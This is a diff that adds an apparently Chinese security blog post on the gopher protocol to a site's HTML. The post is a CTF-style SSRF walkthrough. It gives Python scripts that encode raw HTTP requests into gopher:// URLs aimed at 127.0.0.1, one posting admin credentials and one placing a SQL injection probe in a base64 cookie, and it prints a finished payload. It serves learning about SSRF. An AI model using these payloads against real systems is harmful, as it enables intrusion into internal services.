@@ -136,6 +136,49 @@
     <header class="article-header">
         
         <h1 itemprop="name">
+            <a href="/2023/07/01/gopher%E5%8D%8F%E8%AE%AE/">gopher协议</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="http://example.com/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-07-01T12:52:25.000Z" itemprop="datePublished">2023-07-01</time>
+</a>
+
+            
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <h1 id="编写payload脚本，实现内部访问："><a href="#编写payload脚本，实现内部访问：" class="headerlink" title="编写payload脚本，实现内部访问："></a>编写payload脚本，实现内部访问：</h1><p><em>import urllib.parse</em></p>
+<p>host &#x3D; “127.0.0.1:80”<br>content &#x3D; “uname&#x3D;admin&amp;passwd&#x3D;admin”<br>content_length &#x3D; len(content)</p>
+<p>test &#x3D;<br>“””POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>User-Agent: curl&#x2F;7.43.0<br>Accept: <em>&#x2F;</em><br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: {}</p>
+<p>{}<br>“””.format(host,content_length,content)<br>&#x2F;&#x2F;按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。<br>因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符<br>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<h2 id="这个脚本的意思就是构造一个数据包，用gopher协议发送"><a href="#这个脚本的意思就是构造一个数据包，用gopher协议发送" class="headerlink" title="这个脚本的意思就是构造一个数据包，用gopher协议发送"></a>这个脚本的意思就是构造一个数据包，用gopher协议发送</h2><p>运行脚本获得payload如下：gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl&#x2F;7.43.0%250D%250AAccept%253A%2520%252A&#x2F;%252A%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</p>
+<h3 id="抓包获取"><a href="#抓包获取" class="headerlink" title="抓包获取"></a>抓包获取</h3><ol>
+<li>可以发现setcookie的值为admin的base64编码值。</li>
+</ol>
+<p>猜测在setcookie处为注入点，首先测试是字符型还是整数型注入，构造payload为admin’ #<br>构造脚本</p>
+<p>import urllib.parse</p>
+<p>host &#x3D; “127.0.0.1:80”<br>cookie&#x3D;”this_is_your_cookie&#x3D;YWRtaW4nICM&#x3D;”</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
             <a href="/2023/06/29/ssrf%E8%AF%A6%E8%A7%A3/">ssrf详解</a>
         </h1>
         
